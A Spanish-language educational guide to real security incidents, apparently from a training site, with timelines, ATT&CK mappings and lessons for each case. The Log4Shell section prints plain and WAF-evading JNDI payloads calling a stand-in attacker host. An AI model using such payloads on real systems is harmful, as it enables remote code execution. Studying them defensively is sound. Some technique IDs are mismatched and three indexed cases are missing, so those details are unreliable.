# 📚 Casos de Estudio - Incidentes de Seguridad Reales

## 📋 Descripción

Análisis de incidentes de seguridad reales para aprender de las experiencias del mundo real. Cada caso incluye:

- 📖 Cronología del incidente
- 🔍 Técnicas utilizadas (mapeadas a MITRE ATT&CK)
- 🛡️ Respuesta y contención
- 📊 Lecciones aprendidas
- ✅ Mejores prácticas derivadas

---

## 📁 Casos de Estudio Disponibles

### 🔴 Casos Ofensivos (Ataques)

| Caso | Fecha | Tipo | Impacto |
|------|-------|------|---------|
| [Colonial Pipeline](#colonial-pipeline) | 2021 | Ransomware | Crítico |
| [SolarWinds](#solarwinds) | 2020 | Supply Chain | Crítico |
| [Log4Shell](#log4shell) | 2021 | Vulnerabilidad Web | Crítico |
| [Uber Breach](#uber-breach) | 2022 | Ingeniería Social | Alto |
| [Twitter Hack](#twitter-hack) | 2020 | Social Engineering | Alto |

### 🔵 Casos Defensivos (Respuesta)

| Caso | Fecha | Tipo | Lección Principal |
|------|-------|------|-------------------|
| [Target Breach Response](#target-response) | 2013 | Respuesta a Incidentes | Detección tardía |
| [Equifax Breach](#equifax) | 2017 | Vulnerabilidad Web | Parches pendientes |
| [Capital One](#capital-one) | 2019 | Cloud Security | Configuración errónea |

---

## 🔴 Colonial Pipeline (2021)

### Resumen
Ataque de ransomware que afectó el oleoducto más grande de EE.UU., causando desabastecimiento de combustible en la costa este.

### Cronología

```
Mayo 1, 2021    │ Inicio del ataque ransomware
Mayo 7, 2021    │ Colonial Pipeline detecta la intrusión
Mayo 7, 2021    │ Se cierra el oleoducto como medida preventiva
Mayo 12, 2021   │ Se paga rescate de $4.4 millones en Bitcoin
Mayo 12, 2021   │ Oleoducto reanuda operaciones
Mayo 19, 2021   │ FBI confirma DarkSide como responsable
```

### Técnicas Utilizadas (MITRE ATT&CK)

| Técnica | ID | Descripción |
|---------|-----|-------------|
| Phishing | T1566 | Correo electrónico malicioso inicial |
| Credential Access | T1003 | Robo de credenciales VPN |
| Lateral Movement | T1021 | Movimiento en la red |
| Data Encryption | T1486 | Cifrado de datos (Ransomware) |
| Impact | T1486 | Denegación de servicio |

### Análisis de Vulnerabilidades

1. **Credenciales VPN sin MFA**
   - Cuenta de VPN comprometida
   - Sin autenticación de dos factores
   
2. **Segmentación de red insuficiente**
   - Red corporativa conectada con red de producción
   
3. **Falta de monitoreo**
   - No se detectó la actividad anómala a tiempo

### Lecciones Aprendidas

```markdown
✅ Implementar MFA en todos los accesos remotos
✅ Segmentar redes corporativas y de producción
✅ Mantener sistemas de detección actualizados
✅ Tener plan de respuesta a incidentes
✅ Realizar respaldos regulares (3-2-1 rule)
```

### Mejores Prácticas Derivadas

1. **Autenticación:** MFA obligatorio para VPN
2. **Red:** Segmentación y micro-segmentación
3. **Monitoreo:** SIEM con alertas en tiempo real
4. **Respuesta:** Plan documentado y probado
5. **Respaldo:** Regla 3-2-1 (3 copias, 2 medios, 1 externo)

---

## 🔴 SolarWinds (2020)

### Resumen
Ataque de cadena de suministro que comprometió el software Orion de SolarWinds, afectando a agencias gubernamentales y empresas Fortune 500.

### Cronología

```
Octubre 2019    │ Inicio del desarrollo del backdoor
Febrero 2020    │ Primera versión de SUNBURST publicada
Marzo 2020      │ Actualización comprometida distribuida
Junio 2020      │ FireEye detecta la compromisión
Diciembre 2020  │ Vulnerabilidad revelada públicamente
```

### Técnicas Utilizadas (MITRE ATT&CK)

| Técnica | ID | Descripción |
|---------|-----|-------------|
| Supply Chain Compromise | T1195 | Compromiso del software Orion |
| Command and Control | T1071 | Comunicación con C2 server |
| Lateral Movement | T1021 | Movimiento entre sistemas |
| Credential Access | T1003 | Robo de credenciales |
| Exfiltration | T1041 | Exfiltración de datos |

### Análisis de Vulnerabilidades

1. **Cadena de suministro**
   - Software actualizado desde fuente confiable
   - No se verificó integridad del código

2. **Detección tardía**
   - Backdoor activo por meses
   - Actividad confundida con tráfico normal

3. **Movimiento lateral**
   - Acceso a múltiples agencias
   - Escalada de privilegios

### Lecciones Aprendidas

```markdown
✅ Verificar integridad de actualizaciones (SBOM)
✅ Implementar Zero Trust
✅ Monitoreo de comportamiento anómalo
✅ Segmentación de red estricta
✅ Auditorías de seguridad regulares
```

### Mejores Prácticas Derivadas

1. **Supply Chain:** SBOM (Software Bill of Materials)
2. **Zero Trust:** No confiar, siempre verificar
3. **Monitoreo:** Análisis de comportamiento (UEBA)
4. **Segmentación:** Microsegmentación de red
5. **Respuesta:** Plana de respuesta a incidentes

---

## 🔴 Log4Shell (2021)

### Resumen
Vulnerabilidad crítica en la biblioteca Log4j que permitía ejecución remota de código (RCE) en millones de aplicaciones Java.

### Cronología

```
Noviembre 24, 2021 │ Vulnerabilidad descubierta por Alibaba
Diciembre 9, 2021  │ CVE-2021-44228 asignado
Diciembre 10, 2021 │ Vulnerabilidad revelada públicamente
Diciembre 11, 2021 │ Exploit activo en la naturaleza
Diciembre 14, 2021 │ Ataques masivos reportados
```

### Técnica Utilizada

| Técnica | ID | Descripción |
|---------|-----|-------------|
| JNDI Injection | T1059 | Inyección via JNDI Lookup |
| Remote Code Execution | T1059 | Ejecución de código remoto |

### Ejemplo de Payload

```bash
# Payload básico
${jndi:ldap://attacker.com/exploit}

# Payload ofuscado
${${lower:j}ndi:${lower:l}dap://attacker.com/exploit}

# Payload en headers HTTP
X-Api-Version: ${jndi:ldap://attacker.com/exploit}
```

### Análisis de Vulnerabilidades

1. **Biblioteca ampliamente utilizada**
   - Log4j estaba en millones de aplicaciones
   
2. **Facilidad de explotación**
   - Un solo payload puede comprometer el sistema
   
3. **Detección difícil**
   - Payloads ofuscados evitan WAF

### Lecciones Aprendidas

```markdown
✅ Gestionar dependencias (SBOM)
✅ Actualizar bibliotecas regularmente
✅ Implementar WAF con reglas actualizadas
✅ Monitorear tráfico JNDI/LDAP
✅ Usar versiones actualizadas de Log4j (2.17.0+)
```

---

## 🔴 Uber Breach (2022)

### Resumen
Compromiso de la cuenta de un empleado mediante ingeniería social, obteniendo acceso a sistemas críticos.

### Cronología

```
Septiembre 15, 2022 │ Atacante obtiene credenciales de empleado
Septiembre 16, 2022 │ Acceso a consola de administración
Septiembre 16, 2022 │ Datos exfiltrados
Septiembre 19, 2022 │ Vulnerabilidad revelada públicamente
```

### Técnicas Utilizadas (MITRE ATT&CK)

| Técnica | ID | Descripción |
|---------|-----|-------------|
| Phishing | T1566 | Correo electrónico malicioso |
| Social Engineering | T1598 | Ingeniería social al empleado |
| Credential Access | T1557 | Adversary-in-the-Middle |
| Privilege Escalation | T1548 | Escalada de privilegios |

### Análisis de Vulnerabilidades

1. **MFA evadido**
   - Atacante obtuvo token MFA
   
2. **Cuentas de servicio**
   - Credenciales hardcodeadas en scripts
   
3. **Acceso excesivo**
   - Empleado con privilegios innecesarios

### Lecciones Aprendidas

```markdown
✅ MFA resistente a phishing (FIDO2)
✅ Gestión segura de credenciales
✅ Principio de mínimo privilegio
✅ Monitoreo de cuentas de servicio
✅ Concientización contra ingeniería social
```

---

## 🔴 Twitter Hack (2020)

### Resumen
Grupo de atacantes comprometió cuentas de alto perfil (Obama, Musk, Gates) para estafa de criptomonedas.

### Cronología

```
Julio 15, 2020 │ Tweets maliciosos en cuentas comprometidas
Julio 15, 2020 │ Twitter suspende cuentas verificadas
Julio 31, 2020 │ Tres arrestados en relación con el ataque
```

### Técnicas Utilizadas

| Técnica | ID | Descripción |
|---------|-----|-------------|
| Social Engineering | T1598 | Ingeniería social a empleados |
| Credential Access | T1552 | Credenciales en herramientas internas |
| Privilege Escalation | T1078 | Uso de herramientas admin |

### Lecciones Aprendidas

```markdown
✅ Restringir acceso a herramientas internas
✅ Monitoreo de acciones de administradores
✅ Control de acceso basado en roles
✅ Auditorías de herramientas privilegiadas
```

---

## 📊 Plantilla para Crear tus Propios Case Studies

```markdown
# 📋 Caso de Estudio: [Nombre del Incidente]

## 📋 Información General

| Campo | Valor |
|-------|-------|
| **Fecha** | YYYY-MM-DD |
| **Tipo** | Ransomware / Phishing / APT / etc. |
| **Impacto** | Crítico / Alto / Medio / Bajo |
| **Industria** | Tecnología / Salud / Finanzas / etc. |
| **Fuente** | [Link a reporte oficial] |

## 📖 Resumen
[Descripción breve del incidente]

## 📅 Cronología
| Fecha | Evento |
|-------|--------|
| YYYY-MM-DD | [Evento 1] |
| YYYY-MM-DD | [Evento 2] |

## 🔍 Técnicas Utilizadas (MITRE ATT&CK)

| Técnica | ID | Descripción |
|---------|-----|-------------|
| [Técnica] | TXXXX | [Descripción] |

## 🛡️ Respuesta y Contención
[Cómo se respondió al incidente]

## 📊 Lecciones Aprendidas
1. [Lección 1]
2. [Lección 2]

## ✅ Mejores Prácticas Derivadas
1. [Práctica 1]
2. [Práctica 2]

## 📚 Referencias
- [Enlace 1]
- [Enlace 2]
```

---

## 📚 Recursos Adicionales

### Fuentes de Casos de Estudio

| Fuente | Tipo | Link |
|--------|------|------|
| MITRE ATT&CK | Técnicas | https://attack.mitre.org/case-studies/ |
| NIST | Incidentes | https://www.nist.gov/cyberframework |
| SANS | Analyses | https://www.sans.org/white-papers/ |
| Krebs on Security | Noticias | https://krebsonsecurity.com/ |
| BleepingComputer | Noticias | https://www.bleepingcomputer.com/ |

### Certificaciones Relacionadas

| Certificación | Enfoque |
|---------------|---------|
| GCIH | Incident Response |
| GCFA | Forensic Analysis |
| GNFA | Network Forensics |
| GCFE | Forensic Examiner |

---

## 🔄 Actualizaciones

| Fecha | Caso Agregado |
|-------|---------------|
| 2026-08-19 | Colonial Pipeline, SolarWinds, Log4Shell, Uber, Twitter |

---

*Casos de estudio para aprendizaje ético • CyberDefense Pro Network*
